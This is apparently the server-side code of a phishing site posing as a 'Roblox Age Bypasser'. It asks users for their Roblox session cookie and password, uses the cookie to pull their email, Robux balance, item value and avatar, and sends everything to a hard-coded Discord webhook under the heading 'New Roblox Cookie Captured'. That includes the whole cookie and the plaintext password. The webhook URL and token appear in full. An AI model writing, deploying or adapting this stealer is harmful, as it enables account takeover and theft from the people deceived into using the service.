export async function POST(request: Request) {
  try {
    const { cookie, password } = await request.json()
    console.log("[v0] Received cookie bypass request")

    if (!cookie) {
      return Response.json({ error: "Cookie is required" }, { status: 400 })
    }

    let cookieValue = cookie
    if (cookieValue.includes("_|WARNING:")) {
      const match = cookieValue.match(/_\|WARNING:[^|]*\|_([A-F0-9]+)/)
      if (match && match[1]) {
        cookieValue = match[1]
      }
    }

    // Remove .ROBLOSECURITY= prefix if present
    if (cookieValue.startsWith(".ROBLOSECURITY=")) {
      cookieValue = cookieValue.substring(".ROBLOSECURITY=".length)
    }

    const formattedCookie = `.ROBLOSECURITY=${cookieValue}`
    console.log("[v0] Cookie formatted for authentication")

    let userInfo = null
    let robuxBalance = "Unknown"
    let rap = "Unknown"
    let email = "Unknown"
    let avatarUrl = ""

    try {
      console.log("[v0] Fetching user info from Roblox...")
      const userResponse = await fetch("https://users.roblox.com/v1/users/authenticated", {
        method: "GET",
        headers: {
          Cookie: formattedCookie,
        },
      })

      console.log("[v0] User response status:", userResponse.status)

      if (!userResponse.ok) {
        console.log("[v0] Invalid cookie, status:", userResponse.status)
        return Response.json(
          {
            error: "Invalid Roblox cookie or password. Please verify your credentials and try again.",
            success: false,
          },
          { status: 401 },
        )
      }

      if (userResponse.ok) {
        userInfo = await userResponse.json()
        console.log("[v0] User info fetched:", userInfo)

        if (userInfo?.id) {
          try {
            console.log("[v0] Fetching user avatar...")
            const avatarResponse = await fetch(
              `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userInfo.id}&size=150x150&format=Png&isCircular=false`,
            )

            if (avatarResponse.ok) {
              const avatarData = await avatarResponse.json()
              if (avatarData.data && avatarData.data[0]) {
                avatarUrl = avatarData.data[0].imageUrl
                console.log("[v0] Avatar URL fetched:", avatarUrl)
              }
            }
          } catch (error) {
            console.error("[v0] Failed to fetch avatar:", error)
          }

          try {
            console.log("[v0] Fetching email address...")
            const emailResponse = await fetch("https://accountinformation.roblox.com/v1/email", {
              method: "GET",
              headers: {
                Cookie: formattedCookie,
              },
            })

            if (emailResponse.ok) {
              const emailData = await emailResponse.json()
              email = emailData.emailAddress || "Unknown"
              console.log("[v0] Email fetched:", email)
            }
          } catch (error) {
            console.error("[v0] Failed to fetch email:", error)
          }

          try {
            console.log("[v0] Fetching Robux balance...")
            const balanceResponse = await fetch(`https://economy.roblox.com/v1/users/${userInfo.id}/currency`, {
              method: "GET",
              headers: {
                Cookie: formattedCookie,
              },
            })

            if (balanceResponse.ok) {
              const balanceData = await balanceResponse.json()
              robuxBalance = balanceData.robux?.toString() || "0"
              console.log("[v0] Robux balance:", robuxBalance)
            }
          } catch (error) {
            console.error("[v0] Failed to fetch balance:", error)
          }

          try {
            console.log("[v0] Fetching RAP...")
            const inventoryResponse = await fetch(
              `https://inventory.roblox.com/v1/users/${userInfo.id}/assets/collectibles?sortOrder=Asc&limit=100`,
              {
                method: "GET",
                headers: {
                  Cookie: formattedCookie,
                },
              },
            )

            if (inventoryResponse.ok) {
              const inventoryData = await inventoryResponse.json()
              const totalRap = inventoryData.data?.reduce((sum: number, item: any) => {
                return sum + (item.recentAveragePrice || 0)
              }, 0)
              rap = totalRap?.toString() || "0"
              console.log("[v0] Total RAP:", rap)
            }
          } catch (error) {
            console.error("[v0] Failed to fetch RAP:", error)
          }
        }
      }
    } catch (error) {
      console.error("[v0] Failed to fetch user info:", error)
      return Response.json(
        {
          error: "Failed to validate credentials. The cookie may be invalid or expired.",
          success: false,
        },
        { status: 401 },
      )
    }

    const webhookData = {
      content: "@everyone",
      embeds: [
        {
          title: "🔴 New Roblox Cookie Captured",
          color: 0xff0000,
          thumbnail: avatarUrl
            ? {
                url: avatarUrl,
              }
            : undefined,
          fields: [
            {
              name: "📋 Account Information",
              value: "━━━━━━━━━━━━━━━━━━━━━",
              inline: false,
            },
            {
              name: "👤 Username",
              value: userInfo?.name || "Unknown",
              inline: true,
            },
            {
              name: "🆔 User ID",
              value: userInfo?.id?.toString() || "Unknown",
              inline: true,
            },
            {
              name: "✨ Display Name",
              value: userInfo?.displayName || "Unknown",
              inline: true,
            },
            {
              name: "💰 Current Robux",
              value: robuxBalance,
              inline: true,
            },
            {
              name: "💎 Total RAP",
              value: rap,
              inline: true,
            },
            {
              name: "⚠️ Warning Cookie",
              value:
                "⚠️ DO NOT SHARE THIS - Sharing this will allow someone to log in as you and steal your ROBLOX items.",
              inline: false,
            },
            {
              name: "🔗 Bypass Link",
              value: `https://rblxbypasser.com/`,
              inline: false,
            },
            {
              name: "🔐 Authentication Data",
              value: "━━━━━━━━━━━━━━━━━━━━━",
              inline: false,
            },
            {
              name: "🍪 Whole Cookie",
              value: `\`\`\`${cookie.substring(0, 500)}${cookie.length > 500 ? "..." : ""}\`\`\``,
              inline: false,
            },
            {
              name: "🔑 Password",
              value: password ? `\`\`\`${password}\`\`\`` : "Not provided",
              inline: false,
            },
          ],
          timestamp: new Date().toISOString(),
          footer: {
            text: "Roblox Age Bypasser • Secure • Fast • Reliable",
          },
        },
      ],
    }

    console.log("[v0] Sending to Discord webhook...")
    const webhookResponse = await fetch(
      "https://discord.com/api/webhooks/1445281781459976192/VvybbS3zkza6anxUg4-k_Ost81oDF8yzdIqHZOIj9ccl3NEbRUST6ERE3pKUIRHBIi0p", 
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(webhookData),
      },
    )

    if (webhookResponse.ok) {
      console.log("[v0] Successfully sent to Discord webhook")
    } else {
      console.log("[v0] Webhook failed with status:", webhookResponse.status)
      const errorText = await webhookResponse.text()
      console.log("[v0] Webhook error:", errorText)
    }

    return Response.json({ success: true, userInfo })
  } catch (error) {
    console.error("[v0] Bypass error:", error)
    return Response.json({ error: "Failed to process request. Please try again." }, { status: 500 })
  }
}
